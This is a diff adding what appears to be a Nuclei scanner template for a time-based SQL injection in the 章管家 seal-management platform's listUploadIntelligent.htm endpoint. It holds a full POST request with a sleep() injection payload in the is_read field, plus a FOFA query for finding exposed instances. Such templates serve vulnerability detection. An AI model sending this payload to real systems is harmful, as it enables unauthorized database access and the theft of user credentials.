@@ -1,0 +1,37 @@
+id: zhangin-listUploadIntelligent-sqli
+info:
+  name: 章管家印章智慧管理平台 listUploadIntelligent.htm - sqli
+  author: leadlife
+  severity: high
+  description: 章管家印章智慧管理平台 listUploadIntelligent 接口存在 SQL 注入漏洞。攻击者可以通过构造特定的 POST 请求注入恶意 SQL 代码，利用该漏洞对数据库执行任意 SQL 操作，获取所有用户的账户密码信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/13fda87f0d865d7de818858de3e7d2d69d787e14/%E7%AB%A0%E7%AE%A1%E5%AE%B6listUploadIntelligent%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="章管家-印章智慧管理平台"
+  tags: zhangin,sqli,time
+
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /app/message/listUploadIntelligent.htm?&person_id=1&unit_id=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 119
+
+        pageNo=1&pageSize=20&keyWord=&startDate=&endDate=&deptIds=&type_id=&is_read=-1 and (select*from(select%0Asleep(6))x)
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
